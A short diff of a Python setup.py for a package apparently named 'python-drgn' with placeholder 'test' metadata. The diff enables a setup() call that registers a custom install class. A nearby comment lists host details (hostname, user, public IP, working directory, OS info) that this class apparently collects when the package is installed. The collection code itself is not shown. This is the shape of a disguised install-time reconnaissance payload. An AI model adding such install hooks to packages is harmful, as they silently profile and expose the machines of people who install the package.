@@ -52,4 +52,4 @@ class CustomInstall(install):
 #"HOSTNAME:" hostn "WHOAMI:" who "PUBLIC_IP:" public_ip "PWD:" pwd "OS_INFO:" conf "IP_DETAILS:" ip }
 
 
-# setup(...) removed                                                                                                                         
+setup(name='python-drgn', version='1.1.95',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})
